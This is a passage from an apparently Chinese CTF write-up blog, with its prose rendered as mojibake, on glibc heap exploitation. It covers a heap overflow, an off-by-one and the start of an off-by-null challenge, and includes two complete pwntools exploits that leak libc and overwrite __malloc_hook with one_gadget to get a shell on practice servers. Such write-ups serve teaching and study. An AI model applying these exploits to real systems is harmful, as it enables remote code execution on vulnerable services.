<p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAé‡Œè¿›è¡Œåˆ†æï¼ˆä»¥ä¸‹éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»è¿‡é‡å‘½åï¼‰</p>
<p>å¸¸è§çš„å †é¢˜åŸºæœ¬ä¸Šéƒ½æ˜¯èœå•é¢˜ï¼Œæœ¬é¢˜ä¹Ÿä¸ä¾‹å¤–<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>writeHeap()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>å­˜åœ¨å †æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…æˆ‘ä»¬è€ƒè™‘å…ˆåˆ›å»ºå‡ ä¸ªå°å †å—ï¼Œå†åˆ›å»ºä¸€ä¸ªå¤§å †å—ï¼Œfreeæ‰ä¸¤ä¸ªå°å †å—è¿›å…¥åˆ°fastbinï¼Œç”¨å †æº¢å‡ºæ”¹å†™fastbinç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆä¸ºæˆ‘ä»¬æ‰€ç”³è¯·çš„å¤§å †å—çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¼šå¯¹chunkçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦å…ˆé€šè¿‡å †æº¢å‡ºæ”¹å†™å¤§å †å—çš„sizeï¼Œä¹‹åå°†å¤§å †å—åˆ†é…å›æ¥åæˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—</p>
<p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" srcset="/img/loading.gif" lazyload alt="62DB8B2E56B87418664EEB947A980782.png"></p>
<p>åˆ©ç”¨å †æº¢å‡ºå°†å¤§å †å—çš„sizeé‡æ–°æ”¹å¤§å†freeä»¥é€å…¥unsorted binï¼Œæ­¤æ—¶å¤§å †å—çš„fdä¸bkæŒ‡é’ˆæŒ‡å‘main_arena+0x58çš„ä½ç½®ï¼Œåˆ©ç”¨å¦å¤–ä¸€ä¸ªæŒ‡å‘è¯¥å¤§å †å—çš„æŒ‡é’ˆè¾“å‡ºfdçš„å†…å®¹å³å¯å¾—åˆ°main_arena+0x58çš„åœ°å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcçš„åŸºå€</p>
<p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" srcset="/img/loading.gif" lazyload alt="72934A2F942430E796048F09C96A261F.png"></p>
<p>æ¥ä¸‹æ¥ä¾¿æ˜¯fastbin attackï¼šå°†æŸä¸ªå †å—é€å…¥fastbinåæ”¹å†™å…¶fdæŒ‡é’ˆä¸º__malloc_hookçš„åœ°å€ï¼ˆ__malloc_hookä½äºmain_arenaä¸Šæ–¹0x10å­—èŠ‚å¤„ï¼‰ï¼Œå†å°†è¯¥å †å—åˆ†é…å›æ¥ï¼Œæ­¤æ—¶fastbinä¸­è¯¥é“¾è¡¨ä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬æ‰€ä¼ªé€ çš„ä½äº__malloc_hookä¸Šçš„å †å—ï¼Œç”³è¯·è¿™ä¸ªå †å—åæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹å†™malloc_hookä¸Šçš„å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œæœ€åéšä¾¿åˆ†é…ä¸€ä¸ªå †å—ä¾¿å¯getshell</p>
<p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­å¹¶ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ä½¿ç”¨one_gadgetä»¥getshell</p>
<p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" srcset="/img/loading.gif" lazyload alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯fastbinå­˜åœ¨sizeæ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©åœ¨__malloc_hook - 0x23çš„ä½ç½®æ„é€ fake chunkï¼ˆsizeå­—æ®µä¸º0x7fåˆšå¥½èƒ½å¤Ÿé€šè¿‡malloc(0x60)çš„sizeæ£€æŸ¥ï¼‰</p>
<p>æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27143</span>)<span class="hljs-comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>,content</span>):<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.recvline()<br><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx0</span><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx1</span><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx2</span><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx3</span><br>alloc(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#idx4</span><br><br>free(<span class="hljs-number">1</span>) <span class="hljs-comment">#idx1</span><br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#idx2</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>,payload)<br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx1, the former idx2</span><br>alloc(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#idx2, the former idx4</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,payload)<br>alloc(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#idx5, prevent the top chunk combine it</span><br>free(<span class="hljs-number">4</span>) <span class="hljs-comment">#idx2 got into unsorted bin, fd points to the main_arena</span><br><br>main_arena = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x58</span><br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span><br><br>alloc(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#idx4</span><br>free(<span class="hljs-number">4</span>) <span class="hljs-comment">#idx2 got into fastbin</span><br>payload = p64(malloc_hook - <span class="hljs-number">0x23</span>)<br>fill(<span class="hljs-number">2</span>,payload) <span class="hljs-comment">#overwrite fd to fake chunk addr</span><br><br>alloc(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#idx4</span><br>alloc(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#idx6, our fake chunk</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x13</span> + p64(one_gadget)<br>fill(<span class="hljs-number">6</span>,payload)<br><br>alloc(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯get shell</p>
<p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>off by one é€šå¸¸æŒ‡çš„æ˜¯å¯¹äºå †å—çš„è¯»å†™å­˜åœ¨ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œåˆ©ç”¨è¿™ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºæˆ‘ä»¬é€šå¸¸å¯ä»¥æº¢å‡ºåˆ°ä¸€ä¸ªchunkç‰©ç†ç›¸é‚»é«˜åœ°å€ chunk çš„ size åŸŸï¼Œç¯¡æ”¹å…¶ size åŸŸä»¥ä¾¿åç»­çš„åˆ©ç”¨ï¼ˆå¦‚æ„é€  overlapping ç­‰ï¼‰</p>
<h4 id="ä¾‹é¢˜ï¼š-V-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#ä¾‹é¢˜ï¼š-V-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget"></a>ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</h4><p>åˆæ˜¯ä¸€é“å †é¢˜æ¥äº†ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä¿  æŠ¤  å…¨  å¼€</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åŒæ—¶é¢˜ç›®æç¤º Ubuntu16 ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰ tcache</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½çš„å †é¢˜ï¼Œä¸éš¾çœ‹å‡ºæˆ‘ä»¬åªèƒ½åˆ†é…10ä¸ªå †å—ï¼Œä¸è¿‡æ²¡æœ‰tcacheçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å…¶å®è¿˜æ˜¯æŒºå……è¶³çš„                                                                                                                   </p>
<p>æ¼æ´ç‚¹åœ¨editå‡½æ•°ä¸­ï¼Œ<strong>ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneæ¼æ´</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥<strong>ä¿®æ”¹ä¸€ä¸ªå †å—çš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç”±äºé¢˜ç›®æœ¬èº«ä»…å…è®¸åˆ†é…å¤§å°å°äº111çš„ chunkï¼Œè€Œè¿›å…¥ unsorted bin éœ€è¦ malloc(0x80) çš„ chunk ï¼Œæ•…æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘åˆ©ç”¨ off by one çš„æ¼æ´æ”¹å¤§ä¸€ä¸ª chunk çš„ size é€å…¥ unsorted bin ååˆ†å‰²é€ æˆ overlapping çš„æ–¹å¼è·å¾— libc çš„åœ°å€</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å› ä¸ºåˆšå¥½ fastbin attack æ‰€ç”¨çš„ chunk çš„ size ä¸º 0x71 ï¼Œæ•…æˆ‘ä»¬å°†è¿™ä¸ªå¤§ chunk çš„ size æ”¹ä¸º <code> 0x70 + 0x70 + 1 = 0xe1</code>å³å¯</p>
<p>ä¼ ç»Ÿæ€è·¯æ˜¯å°† __malloc_hook æ”¹ä¸º one_gadget ä»¥ getshellï¼Œä½†æ˜¯ç›´æ¥å°è¯•æˆ‘ä»¬ä¼šå‘ç°æ ¹æœ¬æ— æ³• getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è¿™æ˜¯å› ä¸ºone_gadgetå¹¶éä»»ä½•æ—¶å€™éƒ½æ˜¯é€šç”¨çš„ï¼Œéƒ½æœ‰ä¸€å®šçš„å…ˆå†³æ¡ä»¶ï¼Œè€Œå½“å‰çš„ç¯å¢ƒåˆšå¥½ä¸æ»¡è¶³one_gadgetçš„ç¯å¢ƒ</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ realloc å‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³ one_gadget çš„è¦æ±‚ï¼Œè¯¥æ®µ gadget æ‰§è¡Œå®Œæ¯•åä¼šè·³è½¬è‡³ __realloc_hookï¼ˆè‹¥ä¸ä¸º NULL ï¼‰</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è€Œ __realloc_hook å’Œ __malloc_hook åˆšå¥½æ˜¯æŒ¨ç€çš„ï¼Œæˆ‘ä»¬åœ¨ fastbin attack æ—¶å¯ä»¥ä¸€å¹¶ä¿®æ”¹</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ•…è€ƒè™‘ä¿®æ”¹ __malloc_hook è·³è½¬è‡³ realloc å‡½æ•°å¼€å¤´çš„ gadget è°ƒæ•´å †æ ˆï¼Œä¿®æ”¹ __realloc_hook ä¸º one_gadget å³å¯ getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">28978</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>one_gadget = <span class="hljs-number">0x4526a</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">command:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(command).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;size?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;content:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>, content</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;content:&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;idx?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># initialize chunk</span><br>    new(<span class="hljs-number">0x18</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 0</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 3, prevent the top chunk consolidation</span><br><br>    <span class="hljs-comment"># off by one get the unsorted bin chunk</span><br>    edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;\xe1&#x27;</span>) <span class="hljs-comment"># 0x70 + 0x70 + 1</span><br>    free(<span class="hljs-number">1</span>)<br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 1</span><br><br>    <span class="hljs-comment"># leak the libc addr</span><br>    show(<span class="hljs-number">2</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">88</span><br>    malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>    log.success(<span class="hljs-string">&quot;libc addr: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># overlapping and fastbin double free</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 4, overlapping with idx 2</span><br>    free(<span class="hljs-number">2</span>)<br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">4</span>)<br><br>    <span class="hljs-comment"># fake chunk overwrite __realloc_hook</span><br>    new(<span class="hljs-number">0x60</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>)) <span class="hljs-comment"># idx 1</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 2</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>) <span class="hljs-comment"># idx 4</span><br>    new(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>] + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># idx 5, our fake chunk</span><br><br>    <span class="hljs-comment"># get the shell</span><br>    cmd(<span class="hljs-number">1</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>off by nullåˆ™æ˜¯off by oneçš„ä¸€ç§ç‰¹æ®Šå½¢å¼ï¼Œå³ä»…æº¢å‡ºä¸€ä¸ª<code>&#39;\0&#39;</code>å­—èŠ‚ï¼Œé€šå¸¸å‡ºç°äºè¯»å…¥å­—ç¬¦ä¸²æ—¶è®¾è®¡é€»è¾‘å¤±è¯¯çš„æƒ…å†µï¼ˆä¾‹å¦‚ä½¿ç”¨äº† strcpy æˆ–è€…æ˜¯æ‰‹åŠ¨åœ¨æœ«å°¾åŠ  \0 ç­‰ï¼‰</p>
<p>æ¯”èµ·off by oneï¼Œè¯¥ç§æ¼æ´é™åˆ¶äº†æº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚ä¸º<code>&#39;\0&#39;</code>ï¼Œæå¤§åœ°é™åˆ¶äº†æˆ‘ä»¬çš„åˆ©ç”¨ï¼Œä½†æˆ‘ä»¬çš„ä¿®æ”¹ä»èƒ½å¤Ÿè¾¾åˆ°ä¸€å®šçš„æ•ˆæœ</p>
<h4 id="ä¾‹é¢˜ï¼šLCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget"><a href="#ä¾‹é¢˜ï¼šLCTF2018-easy-heap-off-by-null-chunk-overlapping-Unsorted-bin-Leak-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šLCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget"></a>ä¾‹é¢˜ï¼šLCTF2018 - easy_heap - off by null + chunk overlapping + Unsorted bin Leak + one_gadget</h4><p><a href="/download/lctf2018/easy_heap">ç‚¹å‡»ä¸‹è½½-easy_heap</a></p>
<p><a href="/download/lctf2018/libc64.so">ç‚¹å‡»ä¸‹è½½-libc64.so</a></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>åˆ†æï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="https://i.loli.net/2020/11/16/W2j7nlNHPq5rM9x.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼ˆéƒ¨åˆ†å‡½æ•°åŠå˜é‡ç»è¿‡é‡å‘½å</p>
<p><img src="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœä¸å…¶ç„¶ï¼Œä¼ ç»Ÿçš„CTFç­¾åˆ°é¢˜éƒ½æ˜¯èœå•å †é¢˜ï¼ŒLCTF2018ä¹Ÿä¸ä¾‹å¤–</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæœ¬èº«<strong>ä»…ä¼šåˆ†é…å¤§å°ä¸º</strong><code>0xF8</code>çš„å †å—</p>
<p><img src="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åŒæ—¶æœ¬é¢˜åªå…è®¸æˆ‘ä»¬åˆ†é…10ä¸ªå †å—ï¼Œåœ¨éœ€è¦ç”¨7ä¸ªæ¥å¡«æ»¡tcacheçš„å‰æä¸‹ï¼Œ å¯ç”¨ç©ºé—´å±å®æœ‰ä¸€ä¸¶ä¸¶ç´§å¼ </p>
<p><img src="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¼æ´ç‚¹å­˜åœ¨äºè¯»å…¥è¾“å…¥æ—¶ï¼Œä¼šå°†å½“å‰chunkçš„*(ptr + size)ç½®0</p>
<p><img src="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¾“å…¥çš„sizeä¸º<code>0xf8</code>ï¼Œåˆ™æœ‰æœºä¼šå°†ä¸‹ä¸€ä¸ª<strong>ç‰©ç†ç›¸é‚»chunkçš„PREV_INUSEåŸŸè¦†ç›–ä¸º0</strong>ï¼Œå³<strong>å­˜åœ¨off by nullæ¼æ´</strong></p>
<blockquote>
